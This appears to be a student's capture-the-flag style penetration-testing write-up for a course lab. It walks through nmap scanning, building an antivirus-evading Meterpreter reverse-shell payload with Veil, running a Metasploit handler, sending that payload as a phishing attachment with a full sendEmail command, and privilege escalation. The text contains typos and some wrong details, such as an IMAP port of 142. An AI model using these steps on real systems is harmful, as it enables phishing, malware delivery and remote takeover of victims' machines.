# Assigment 3
For full executive report, see [PWNChallenge3_GabriellaAhn](https://github.com/haein001/CMU_penetration-testing/blob/52cdf24de5320f4bfafb1f88050de00cfb7c3d1f/pwnchallenge3/PWNChallenge%233.pdf).

1. Scan the host for open ports.

    ``
    nmap -open 10.20.160.10-150
    ``

    10.20.160.10 and 1020.160.86 hosts are found from 10.20.160.10-150.

2. Conduct more thorough scan of 10.20.160.10.
   
    ``
    nmap -A 10.20.160.10
    ``
    
    - **Port 25(smtp)**: the default port for relaying email on the internet.
    
    - **Port 110(pop3)**: used by the POP3 protocol for unencrypted access to electronic mail.
    
    - **Port 142(IMAP)**: a mail protocol used to access a mailbox on a remoteserver from a local email client.
    
3. To use email vulnerable, use Veil to create payload that could be attached in the email.
    
    - **Veil**: a tool to generate payload executables that bypass common antivirus.

    ``
    languge: powershell
    ``
    
    ``
    payload module: powershell/meterpreter/rev_tcp
    ``
    
4. To send email and get the respose, exploit handler first.
    
    - **Handler**: a process attacking mackine(metasploit) that listens and responds to connections made from the target.
    
    ``
    use multi/handler
    ``
   
5. Set payload.
   
    ``
    set PAYLOAD windows/meterpreter/reverse_tcp
    ``

6. Then, exploit

    ``
    exploit
    ``
    
    Now, handler is on.
    
7. Send phishing email attaching the bat file made from Veil.

    ``
   sendEmail -f caspian@dotcof.net -t olivia@pwn3.local -u update -m update -s 10.20.160.10 -a /var/lib/veil/output/source/update.bat -o tls=no
    ``

8. Successfully sending the email, new session 10.20.160.86 is opened. We are able to go into Olivia's desktop.
    
    ``
    type local.txt
    ``

9. To get proof.txt, we need to escalate the privilege.

    - **Local Explout Suggester:** post-exploitation module that you can use to check a system for local
vulnerabilities

    ``
    use  multi/recon/local_exploit_suggester
    ``
    
    ``
    exploit
    ``
    
10. Check the server username to see it has changed to authority.

    ``
    get uid
    ``
11. Then, use windows command to search the proof.txt.
